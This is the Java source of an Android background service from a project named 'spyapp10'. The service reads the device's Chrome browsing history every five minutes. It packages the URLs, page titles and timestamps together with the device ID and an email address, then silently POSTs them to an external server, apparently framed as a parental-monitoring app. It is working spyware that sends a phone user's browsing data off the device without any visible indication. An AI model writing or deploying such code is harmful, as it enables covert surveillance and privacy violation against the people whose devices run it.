package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class browserHistoryService extends Service {
    public browserHistoryService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        getBrowser(getApplicationContext());
                        sleep(300000);
                    } catch (Exception e) {
                    }
                }
            }
        };
        runnable.start();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void getBrowser(Context context) {
        try {
            Log.e("myservice","browerServiceStarted");
            Uri uri=Uri.parse("content://com.android.chrome.browser/history");
            Cursor mCur = context.getContentResolver().query(uri, null, null, null, null);
            mCur.moveToFirst();
            String url = "", title = "", date = "", time = "";
            while (!mCur.isLast()) {
                url += mCur.getString(mCur.getColumnIndex("url")) + "||";
                title += mCur.getString(mCur.getColumnIndex("title")) + "||";
                date = mCur.getString(mCur.getColumnIndex("date"));
                Date callDayTime = new Date(Long.valueOf(date));
                time += "DAY-" + new SimpleDateFormat("yyyy-MM-dd").format(callDayTime) + "   TIME-" +
                        new SimpleDateFormat("H:mm").format(callDayTime) + "||";
                mCur.moveToNext();
            }
            mCur.close();
            String DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
            String Email=MainActivity.EMAIL;
            new UpdateUserDetailBROWSER().execute(Email, DeviceId, title, url, time);

        } catch (Exception e) {
            Log.e("myservice","errorinBROWSER"+e.toString());
        }
    }

    private class UpdateUserDetailBROWSER extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/browhis.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(5);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("title", params[2]));
                nameValuePair.add(new BasicNameValuePair("link", params[3]));
                nameValuePair.add(new BasicNameValuePair("time", params[4]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}
